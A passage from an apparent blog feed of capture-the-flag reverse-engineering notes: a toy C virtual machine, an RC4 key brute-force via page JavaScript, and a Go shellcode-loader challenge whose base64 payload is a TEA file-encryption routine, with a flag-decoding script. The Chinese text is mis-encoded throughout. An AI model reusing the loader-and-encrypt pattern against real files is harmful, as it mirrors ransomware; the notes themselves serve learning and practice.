<span class=\"token operator\">+=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"153\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"154\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!=</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"155\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#123;</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>FLG<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre>\t\t\tvm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"157\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"158\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> JMP<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"159\"></td><td><pre>\t\t\tvm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"160\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"161\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> JNE<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"162\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>FLG<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"163\"></td><td><pre>\t\t\tvm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"164\"></td><td><pre>\t\t\t<span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"165\"></td><td><pre>\t\t\tvm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span><span class=\"token operator\">+=</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"166\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"167\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> JE<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"168\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>FLG<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"169\"></td><td><pre>\t\t\tvm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span><span class=\"token operator\">+=</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"170\"></td><td><pre>\t\t\t<span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"171\"></td><td><pre>\t\t\tvm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"172\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"173\"></td><td><pre>            <span class=\"token keyword\">case</span> HLT<span class=\"token operator\">:</span> <span class=\"token comment\">// åœæ­¢æ‰§è¡Œ</span></pre></td></tr><tr><td data-num=\"174\"></td><td><pre>            vm<span class=\"token operator\">-></span>running <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// å°†è¿è¡ŒçŠ¶æ€ç½®ä¸º 0s</span></pre></td></tr><tr><td data-num=\"175\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"176\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"177\"></td><td><pre>\t\t\t</pre></td></tr><tr><td data-num=\"178\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"179\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"180\"></td><td><pre>\t<span class=\"token comment\">// å®šä¹‰ä¸€ä¸ªæµ‹è¯•å‡½æ•°ï¼Œæ¥å—ä¸€ä¸ªè™šæ‹Ÿæœºå®ä¾‹ä½œä¸ºå‚æ•°</span></pre></td></tr><tr><td data-num=\"181\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">vm_test</span><span class=\"token punctuation\">(</span>VM<span class=\"token operator\">*</span> vm<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"182\"></td><td><pre>    <span class=\"token comment\">// å®šä¹‰ä¸€æ®µæµ‹è¯•ç¨‹åº å®ç°ä¸€ä¸ªå¼‚æˆ–</span></pre></td></tr><tr><td data-num=\"183\"></td><td><pre>    <span class=\"token keyword\">int</span> data<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">12</span><span class=\"token punctuation\">,</span><span class=\"token number\">78</span><span class=\"token punctuation\">,</span><span class=\"token number\">45</span><span class=\"token punctuation\">,</span><span class=\"token number\">68</span><span class=\"token punctuation\">,</span><span class=\"token number\">44</span><span class=\"token punctuation\">,</span><span class=\"token number\">78</span><span class=\"token punctuation\">,</span><span class=\"token number\">45</span><span class=\"token punctuation\">,</span><span class=\"token number\">79</span><span class=\"token punctuation\">,</span><span class=\"token number\">99</span><span class=\"token punctuation\">,</span><span class=\"token number\">67</span><span class=\"token punctuation\">,</span><span class=\"token number\">34</span><span class=\"token punctuation\">,</span><span class=\"token number\">67</span><span class=\"token punctuation\">,</span><span class=\"token number\">45</span><span class=\"token punctuation\">,</span><span class=\"token number\">78</span><span class=\"token punctuation\">,</span><span class=\"token number\">32</span><span class=\"token punctuation\">,</span><span class=\"token number\">45</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// çè¾“çš„ä¸€ä¸²æ•°æ®</span></pre></td></tr><tr><td data-num=\"184\"></td><td><pre>    <span class=\"token comment\">/*</span></pre></td></tr><tr><td data-num=\"185\"></td><td><pre>    for (int i=2; i&lt;16; i+=2)&#123;</pre></td></tr><tr><td data-num=\"186\"></td><td><pre>        data[i+1] = data[i]^data[i+1];</pre></td></tr><tr><td data-num=\"187\"></td><td><pre>    &#125;</pre></td></tr><tr><td data-num=\"188\"></td><td><pre>    */</pre></td></tr><tr><td data-num=\"189\"></td><td><pre>    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"190\"></td><td><pre>    vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>SP<span class=\"token punctuation\">]</span><span class=\"token operator\">--</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>data<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// è¯»å–æ•°æ®åˆ°å†…å­˜</span></pre></td></tr><tr><td data-num=\"191\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"192\"></td><td><pre>    <span class=\"token class-name\">uint8_t</span> prog<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>MOV<span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>R3<span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span>MOV<span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>R4<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>POP<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>POP<span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>ALU<span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> R0<span class=\"token punctuation\">,</span> R1<span class=\"token punctuation\">,</span>PUSH<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>POP<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>ALU<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>R3<span class=\"token punctuation\">,</span>R4<span class=\"token punctuation\">,</span>CMP<span class=\"token punctuation\">,</span>R3<span class=\"token punctuation\">,</span>R4<span class=\"token punctuation\">,</span>JNE<span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span>HLT<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"193\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"194\"></td><td><pre>    <span class=\"token keyword\">int</span> len <span class=\"token operator\">=</span> <span class=\"token function\">vm_load</span><span class=\"token punctuation\">(</span>vm<span class=\"token punctuation\">,</span> prog<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// åŠ è½½æµ‹è¯•ç¨‹åºåˆ°è™šæ‹Ÿæœºå†…å­˜ä¸­ï¼Œå¹¶è·å–ç¨‹åºé•¿åº¦</span></pre></td></tr><tr><td data-num=\"195\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Loaded %d bytes of program.\\n\"</span><span class=\"token punctuation\">,</span> len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// æ‰“å°ç¨‹åºé•¿åº¦</span></pre></td></tr><tr><td data-num=\"196\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"197\"></td><td><pre>    <span class=\"token function\">vm_exec</span><span class=\"token punctuation\">(</span>vm<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// æ‰§è¡Œè™šæ‹Ÿæœº</span></pre></td></tr><tr><td data-num=\"198\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"199\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"200\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Register values:\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>     <span class=\"token comment\">// æ‰“å°å¯„å­˜å™¨çš„å€¼</span></pre></td></tr><tr><td data-num=\"201\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"202\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"R%d: %d\\n\"</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">,</span> vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"203\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"204\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>SP<span class=\"token punctuation\">]</span><span class=\"token operator\">+=</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"205\"></td><td><pre>    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"206\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d \"</span><span class=\"token punctuation\">,</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>SP<span class=\"token punctuation\">]</span><span class=\"token operator\">--</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// æ‰“å°å†…å­˜ä¸­çš„æ•°æ®</span></pre></td></tr><tr><td data-num=\"207\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"208\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Execution finished.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// æ‰“å°æ‰§è¡Œç»“æŸ</span></pre></td></tr><tr><td data-num=\"209\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"210\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"211\"></td><td><pre>\t<span class=\"token function\">vm_test</span><span class=\"token punctuation\">(</span> <span class=\"token function\">vm_create</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"212\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h4 id=\"å®ç°äº†ä¸€ä¸ªç®€å•çš„åŠ å¯†\"><a class=\"markdownIt-Anchor\" href=\"#å®ç°äº†ä¸€ä¸ªç®€å•çš„åŠ å¯†\">#</a> å®ç°äº†ä¸€ä¸ªç®€å•çš„åŠ å¯†:</h4>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    for (int i=2; i&lt;16; i+=2)&#123;</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        data[i+1] = data[i]^data[i+1];</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    &#125;</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    */</pre></td></tr></table></figure><p>å‘œå‘œå‘œ æœ¬æ¥æƒ³ç”¨è™šæ‹Ÿæœºå®ç°ä¸€ä¸ª TEA åŠ å¯†çš„ ä½†æ˜¯è¿™å‡ å¤©å¾—ç”²æµäº†ç­‰æˆ‘å†™å‡ºæ¥äº† å†è´´ä¸Šæ¥</p>\n<h2 id=\"lc-3è™šæ‹Ÿæœº\"><a class=\"markdownIt-Anchor\" href=\"#lc-3è™šæ‹Ÿæœº\">#</a> LC-3 è™šæ‹Ÿæœº</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuam1laW5lcnMuY29tL2xjMy12bS8=\">https://www.jmeiners.com/lc3-vm/</span></p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "ç¬”è®°"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/02/26/VNCTF/",
            "url": "https://3cly.github.io/2023/02/26/VNCTF/",
            "title": "VNCTF",
            "date_published": "2023-02-26T06:23:40.000Z",
            "content_html": "<h3 id=\"pzgalaxy\"><a class=\"markdownIt-Anchor\" href=\"#pzgalaxy\">#</a> PZGalaxy</h3>\n<p><img data-src=\"/images/image-20230226142653906.png\" alt=\"image.png\"></p>\n<p>æ ¹æ®é™„ä»¶çš„ md æ–‡ä»¶æ“ä½œæ‰“å¼€ç½‘ç«™ (æœ¬åœ°çš„è¯ç›´æ¥ç‚¹ html æ–‡ä»¶) æŒ‰ F12 å‘ç° RC4 åŠ å¯† å¯†æ–‡å·²ç»ç»™å‡º å¯†é’¥å…± 8 ä½ï¼Œç»™å‡ºå››ä½ 2023 å‰©ä¸‹ 4 ä½çˆ†ç ´å³å¯ æ³¨æ„è¿™é‡Œæ˜¯ js è¯­è¨€</p>\n<p>æˆ‘ç”¨çš„ç«ç‹æµè§ˆå™¨å¯ä»¥ F12 æ‰“å¼€å¼€å‘è€…å·¥å…· åœ¨æŸ¥çœ‹å™¨ä¿®æ”¹ JS æºç </p>\n<p><img data-src=\"/images/image-20230226143924553.png\" alt=\"image.png\"></p>\n<p><img data-src=\"/images/image-20230226144054689.png\" alt=\"image.png\"></p>\n<p>æŠŠåé¢éƒ¨åˆ†æ”¹æˆçˆ†ç ´åæäº¤å°±è¡Œäº†</p>\n<p><img data-src=\"/images/image-20230226144152360.png\" alt=\"image.png\"></p>\n<p>è¿™é‡Œ flag å’Œ WP ä¸ä¸€æ ·åº”è¯¥æ˜¯å› ä¸ºåŠ¨æ€ flag çš„åŸå› å§</p>\n<p><img data-src=\"/images/image-20230226145023901.png\" alt=\"image.png\"></p>\n<p>ä¸€ä¸ªæ˜¯ 0 ä¸€ä¸ªæ˜¯ 1  0-127</p>\n<p>å…¶å®ä¹Ÿå¯ä»¥å¤åˆ¶æ•°æ®å‡ºæ¥ç”¨ python æˆ–è€… C è¯­è¨€çˆ†ç ´</p>\n<p>åé¢é¢˜å°±æ²¡çœ‹äº† å¤ä¹ è€ƒè¯•å»äº†</p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "ç¬”è®°"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/02/26/shellcode&&vm/",
            "url": "https://3cly.github.io/2023/02/26/shellcode&&vm/",
            "title": "shellcode&&vm",
            "date_published": "2023-02-26T06:09:59.000Z",
            "content_html": "<p>å…¶å®æ˜¯ hgame week4 çš„å•¦</p>\n<h3 id=\"shellcode\"><a class=\"markdownIt-Anchor\" href=\"#shellcode\">#</a> shellcode</h3>\n<p><img data-src=\"/images/image-20230210134708555.png\" alt=\"image.png\"></p>\n<p>DIE ä¸­æŸ¥çœ‹å‘ç°ä¸º GO è¯­è¨€</p>\n<p><img data-src=\"/images/image-20230210135005805.png\" alt=\"image.png\"></p>\n<p>IDA ä¸­æŸ¥çœ‹ä¸»å‡½æ•°å‘ç°æœ‰ base64</p>\n<p>ç¨‹åºé€»è¾‘ï¼šå¯¹ shellcode è¿›è¡Œ base64 è§£ç ï¼Œç„¶ååˆ†é…å†…å­˜ï¼Œéå†æ–‡ä»¶å¤¹è¯»æ–‡ä»¶ï¼Œè°ƒç”¨å‡½æ•°åŠ å¯†ï¼Œå†™æ–‡ä»¶ã€‚</p>\n<p><img data-src=\"/images/image-20230210142817599.png\" alt=\"image.png\"></p>\n<p>å¤åˆ¶æ‰¾åˆ°çš„å­—ç¬¦ä¸²å»è§£å¯†ä¸ºæ–°æ–‡ä»¶ (base64 è‚¯å®šæ˜¯å¯è§å­—ç¬¦å‘€)</p>\n<p>VUiD7FBIjWwkIEiJTUBIi0VAiwCJRQC4BAAAAEgDRUCLAIlFBMdFCAAAAADHRQwj782rx0UQFgAAAMdFFCEAAADHRRgsAAAAx0UcNwAAAMdFIAAAAACLRSCD+CBzWotFDANFCIlFCItFBMHgBANFEItVCANVBDPCi1UEweoFA1UUM8IDRQCJRQCLRQDB4AQDRRiLVQgDVQAzwotVAMHqBQNVHDPCA0UEiUUEuAEAAAADRSCJRSDrnkiLRUCLVQCJELgEAAAASANFQItVBIkQSI1lMF3D</p>\n<p><img data-src=\"/images/image-20230210142329512.png\" alt=\"image.png\"></p>\n<p>010 ç¼–è¾‘å™¨é€‰æ‹©ç²˜è´´è‡ª base64</p>\n<p><img data-src=\"/images/image-20230210142534042.png\" alt=\"image.png\"></p>\n<p>æ–°æ–‡ä»¶ç”¨ IDA é€‰æ‹© 64 ä½æ‰“å¼€å…¨é€‰å create function å†æŒ‰ F5 å‘ç°ä¸€ä¸ª TEA</p>\n<p><img data-src=\"/images/image-20230210142649727.png\" alt=\"image.png\"></p>\n<p>é™„ä»¶çš„ enc æ–‡ä»¶å°±æ˜¯åŠ å¯†è¿‡çš„æ•°æ® è§£ TEA ä¹‹åå°±èƒ½å¾—åˆ° flag</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>a<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">0x6d616768</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x68747b65</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x315f7331</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x68745f73</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x75745f33</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x73277574</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x6d30685f</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x72307765</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7d6b</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x4adb98d</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xacb9e545</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token string\">b''</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> a<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    flag <span class=\"token operator\">+=</span>long_to_bytes<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#b\"hgame&#123;th1s_1s_th3_tutu's_h0mew0rk&#125;\\x00\\x8d\\xb9\\xad\\x04E\\xe5\\xb9\\xac\"</span></pre></td></tr></table></figure><p>å®˜æ–¹æ€»ç»“:</p>\n<p>æ ¹æ®é¢˜ç›®åç§°å’Œæç¤ºæ¥çœ‹ï¼Œæ­¤é¢˜ä¸ºä¸€ä¸ª shellcode åŠ è½½å™¨ï¼Œç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ä¼šè§£å¯†ä¸€æ®µæœºå™¨ç æ¥è¿<br>\nè¡Œã€‚go ç¼–è¯‘çš„ç¨‹åºä¸»å‡½æ•°ä¸º main_mainã€‚è§‚å¯Ÿ ida åç¼–è¯‘å‡ºæ¥çš„å†…å®¹ï¼Œå¯å¾ˆæ˜æ˜¾çš„è§‚å¯Ÿåˆ° base64 è§£<br>\nç çš„å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å°†é¢˜ç›®ä¸­çš„ base64 è§£ç å¹¶ä¿å­˜æˆæ–‡ä»¶ï¼Œä½¿ç”¨ ida æ‰“å¼€ï¼Œå³å¯çœ‹å‡ºæ˜¯ tea åŠ å¯†ç®—<br>\næ³•ã€‚ä¹‹åå†åˆ†æé¢˜ç›®çš„æ–‡ä»¶è¯»å–å’ŒåŠ å¯†é€»è¾‘ï¼Œå‘ç°å°±æ˜¯å¾ˆæ™®é€šçš„ 8 å­—èŠ‚ä¸€ç»„è°ƒç”¨ä¸€æ¬¡ base64 çš„æœºå™¨<br>\nç ï¼Œæ‰€ä»¥å†™è§£å¯†è„šæœ¬å³å¯ã€‚</p>\n<h3 id=\"vm\"><a class=\"markdownIt-Anchor\" href=\"#vm\">#</a> VM</h3>\n<p>é™„ä»¶ä¸ºä¸€ä¸ª 64 ä½ç¨‹åº æ”¾è¿› IDA ä¸­</p>\n<p><img data-src=\"/images/image-20230213172010050.png\" alt=\"image.png\"></p>\n<p>åœ¨ main å‡½æ•°ä¸­ï¼Œå¯ä»¥çœ‹åˆ°ç¬¬ 8 è¡Œåˆå§‹åŒ–äº† vm çš„ç»“æ„ä½“</p>\n<p><img data-src=\"/images/image-20230213172927883.png\" alt=\"image.png\"></p>\n<p>ç‚¹å¼€ vm çš„ä¸»ä½“ï¼Œå¯ä»¥çœ‹åˆ°ä¸€ä¸ª while å¾ªç¯ï¼Œbyte_140005360 æ˜¯ä¸€ä¸ªå…¨å±€æ•°ç»„ï¼Œè¯¥å¾ªç¯åœ¨å…¨å±€æ•°ç»„ä¸­æŒ‰ (a1+24) ä¸‹æ ‡å–çš„æ•°æ®åªè¦ä¸æ˜¯ 255 å°±ç»§ç»­æ‰§è¡Œï¼Œå› æ­¤è¯¥å…¨å±€æ•°ç»„ä¸º codeï¼Œå°±æ˜¯æœ¬è™šæ‹Ÿæœºçš„å­—èŠ‚ç æ•°ç»„ã€‚è€Œ (a1+24) åº”è¯¥æ˜¯ rip å¯„å­˜å™¨ã€‚</p>\n<p><img data-src=\"/images/image-20230213174104326.png\" alt=\"image.png\"></p>\n<p>è¿›å…¥ sub_140001940 å‡½æ•° switch-case ç»“æ„ï¼Œè¿™äº›ä¸åŒçš„ case å°±å¯¹åº”ä¸åŒæŒ‡ä»¤äº†</p>\n<p>ç‚¹å¼€ case0</p>\n<p><img data-src=\"/images/image-20230213174612440.png\" alt=\"image.png\"></p>\n<p>é¦–å…ˆ a1 [6] å°±æ˜¯ (a1+24)  (int ä¸º 4 å­—èŠ‚)  ä¹Ÿå°±æ˜¯ rip   åˆ†æçŒœæµ‹ä¸º mov æŒ‡ä»¤ *a1 æ˜¯å¯„å­˜å™¨</p>\n<p>åé¢åˆ†æçš„æ—¶å€™æŒ‰ç…§å®˜æ–¹ WP ç»™å‡ºçš„æ–¹æ³•åœ¨ ida ä¸­æ–°å»ºä¸€ä¸ª structï¼Œå°† rip çš„åç§»ç¡®å®šè¿™æ ·å¥½çœ‹ä¸€ç‚¹</p>\n<p><img data-src=\"/images/image-20230213180631392.png\" alt=\"image.png\"></p>\n<p><img data-src=\"/images/image-20230213180716750.png\" alt=\"image.png\"></p>\n<p>å†æŒ‰ Y æ”¹ a1 ç±»å‹ ï¼ˆæ˜¯æŒ‡é’ˆçš„å“‡ï¼‰</p>\n<p><img data-src=\"/images/image-20230213181028046.png\" alt=\"image.png\"></p>\n<p>case1 æœ‰æ˜æ˜¾çš„æ 